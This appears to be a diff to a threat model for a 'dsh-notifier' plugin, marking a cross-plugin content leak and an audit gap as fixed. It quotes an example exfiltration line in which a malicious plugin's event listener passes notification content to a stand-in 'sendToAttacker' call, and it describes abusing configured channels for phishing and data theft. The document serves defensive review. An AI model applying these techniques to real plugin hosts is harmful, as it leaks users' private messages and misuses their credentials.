@@ -7,7 +7,7 @@ Scope: a malicious or compromised DSH plugin attacking `dsh-notifier` or another
 
 The current DSH composition is a same-process trust domain, not a security boundary. A plugin that can execute ordinary Node.js code can read files and environment variables, observe shared memory, patch globals, and bypass any notifier facade. Our repair scope is limited to `dsh-notifier`: we can reduce disclosure, unauthorized sending, audit gaps, and denial of service through supported notifier paths, but we cannot isolate the host or modify DSH.
 
-The highest-impact notifier defect is that a complete notification record, including message title and content, is emitted through the cross-plugin `dsh-notifier/sent` event. The highest-impact host defect is the absence of a trustworthy plugin identity and runtime capability enforcement.
+The baseline highest-impact notifier defects were complete notification disclosure and an audit gap for directed sends. A1/A2 are now fixed on this branch (`bb03f8a`, `ce68543`); the highest-impact host defect remains the absence of a trustworthy plugin identity and runtime capability enforcement.
 
 ## Evidence And Trust Model
 
@@ -44,7 +44,7 @@ Impact: disclosure or modification of channel credentials, identity bindings, pe
 
 Why notifier cannot fix it: a facade, frozen payload, or reduced export list cannot stop direct OS and process access. This requires host-enforced capability isolation, secret brokering, and a worker/process boundary.
 
-### P1-NOTIFIER-01: Complete notification content leaks across plugins
+### P1-NOTIFIER-01: Complete notification content leaks across plugins (fixed)
 
 Precondition: the attacker can register an event listener in the shared DSH context.
 
@@ -56,15 +56,15 @@ ctx.on('dsh-notifier/sent', record => sendToAttacker(record.message))
 
 Impact: assistant output, error details, approval reasons, user text, and other notification content leave the intended channel. `deepFreeze` does not reduce confidentiality.
 
-Current control: `public.emit` can be disabled, but it defaults on and is all-or-nothing.
+Current control: the cross-plugin projection is metadata-only by default; `public.emit` can still disable the event entirely. Internal ledger/admin records retain the full record.
 
-### P1-NOTIFIER-02: Arbitrary configured-channel use and audit bypass
+### P1-NOTIFIER-02: Arbitrary configured-channel use and audit bypass (audit gap fixed)
 
 Precondition: the attacker can inject the `notifier` service.
 
-Attack: call `ctx.notifier.push(message, { channel: 'telegram' })` or broadcast without a per-plugin channel policy. The direct channel path returns through `notifier.notify()` and does not enter the ledger or `dsh-notifier/sent` sink.
+Attack: call `ctx.notifier.push(message, { channel: 'telegram' })` or broadcast without a per-plugin channel policy. The direct path still permits use of any configured channel; before A2 it bypassed the ledger and `dsh-notifier/sent` sink, while the current branch records the directed outcome through the shared internal audit callback exactly once.
 
-Impact: phishing, spam, data exfiltration, or covert traffic using the user's configured credentials, with no complete audit trail.
+Impact: arbitrary configured-channel use remains a same-process trust-domain risk; the previous missing audit trail is fixed because directed outcomes now use the same internal audit callback exactly once.
 
 ### P1-NOTIFIER-03: Caller-controlled source identity defeats governance
 
